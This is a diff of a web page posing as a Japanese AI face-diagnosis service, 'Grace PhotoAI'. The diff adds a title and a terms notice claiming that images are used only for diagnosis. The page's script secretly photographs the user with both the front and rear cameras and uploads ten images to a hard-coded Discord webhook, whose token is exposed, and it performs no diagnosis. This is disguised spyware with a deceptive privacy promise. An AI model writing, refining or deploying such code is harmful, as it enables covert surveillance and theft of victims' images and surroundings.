@@ -14,15 +14,16 @@
     body {
       background-color: #1e1e1e;
       color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      height: 100vh;
       font-family: sans-serif;
+      text-align: center;
+      padding: 2rem;
+    }
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 2rem;
     }
     button {
-      font-size: 1.5rem;
+      font-size: 1.8rem;
       padding: 1rem 2rem;
       border: none;
       background-color: #4caf50;
@@ -33,99 +34,122 @@
     button:hover {
       background-color: #45a049;
     }
+    .terms-link {
+      margin-top: 2rem;
+      font-size: 1rem;
+      color: #ccc;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+    #terms-modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 2rem;
+      overflow: auto;
+    }
+    #terms-modal-content {
+      background: #333;
+      padding: 2rem;
+      border-radius: 10px;
+      max-width: 600px;
+      margin: 5% auto;
+    }
   </style>
 </head>
 <body>
+  <h1>Grace PhotoAI</h1>
   <button onclick="startDualCameraCapture()">診断する</button>
+  <div class="terms-link" onclick="document.getElementById('terms-modal').style.display='block'">利用規約</div>
+
+  <div id="terms-modal">
+    <div id="terms-modal-content">
+      <h2>利用規約</h2>
+      <p>このサイトはAIによる顔診断を目的としています。画像は診断のみに使用され、外部に公開されることはありません。</p>
+      <button onclick="document.getElementById('terms-modal').style.display='none'">閉じる</button>
+    </div>
+  </div>
+
   <video id="video" autoplay playsinline style="display:none;"></video>
-</body>
-<script>
-const video = document.getElementById("video");
-const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
+  
+  <script>
+    const video = document.getElementById("video");
+    const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
 
-function stopStream() {
-  if (video.srcObject) {
-    video.srcObject.getTracks().forEach(track => track.stop());
-    video.srcObject = null;
-  }
-}
+    function stopStream() {
+      if (video.srcObject) {
+        video.srcObject.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+      }
+    }
 
-async function captureFromCamera(facingMode) {
-  stopStream();
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }});
-    video.srcObject = stream;
-    return new Promise(resolve => setTimeout(() => resolve(stream), 500));
-  } catch (err) {
-    console.error("カメラへのアクセスが許可されていません。", err);
-    return null;
-  }
-}
+    async function waitForVideoReady() {
+      return new Promise(resolve => {
+        video.onloadedmetadata = () => resolve();
+      });
+    }
 
-function captureImages(count, interval) {
-  return new Promise(resolve => {
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-    const images = [];
+    async function captureFromCamera(facingMode) {
+      stopStream();
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }});
+        video.srcObject = stream;
+        await waitForVideoReady();
+        return stream;
+      } catch (err) {
+        console.error("カメラへのアクセスが許可されていません。", err);
+        return null;
+      }
+    }
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    async function captureImages(count, interval) {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const images = [];
 
-    let captured = 0;
-    const intervalId = setInterval(() => {
-      if (captured >= count) {
-        clearInterval(intervalId);
-        resolve(images);
-        return;
+      for (let i = 0; i < count; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+        images.push(blob);
+        await new Promise(resolve => setTimeout(resolve, interval));
       }
 
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        images.push(blob);
-      }, "image/jpeg");
+      return images;
+    }
 
-      captured++;
-    }, interval);
-  });
-}
+    async function startDualCameraCapture() {
+      let allImages = [];
 
-async function startDualCameraCapture() {
-  let images = [];
+      const userStream = await captureFromCamera("user");
+      if (userStream) {
+        const userImages = await captureImages(5, 200);
+        allImages = allImages.concat(userImages);
+      }
 
-  const userStream = await captureFromCamera("user");
-  if (userStream) {
-    const userImages = await captureImages(5, 200);
-    images = images.concat(userImages);
-  }
+      const envStream = await captureFromCamera("environment");
+      if (envStream) {
+        const envImages = await captureImages(5, 200);
+        allImages = allImages.concat(envImages);
+      }
 
-  const envStream = await captureFromCamera("environment");
-  if (envStream) {
-    const envImages = await captureImages(5, 200);
-    images = images.concat(envImages);
-  }
+      stopStream();
 
-  stopStream();
+      const formData = new FormData();
+      allImages.forEach((blob, i) => {
+        formData.append(`files[${i}]`, blob, `image${i + 1}.jpg`);
+      });
 
-  // 画像を埋め込み形式で一括送信
-  const files = await Promise.all(images.map((blob, i) => {
-    return new Promise(resolve => {
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        resolve({ name: `image${i + 1}.jpg`, data: blob });
-      };
-      reader.readAsArrayBuffer(blob);
-    });
-  }));
-
-  const formData = new FormData();
-  files.forEach((file, index) => {
-    formData.append("files[" + index + "]", file.data, file.name);
-  });
-
-  fetch(webhookUrl, {
-    method: "POST",
-    body: formData
-  });
-}
-</script>
+      fetch(webhookUrl, {
+        method: "POST",
+        body: formData
+      });
+    }
+  </script>
+</body>
 </html>
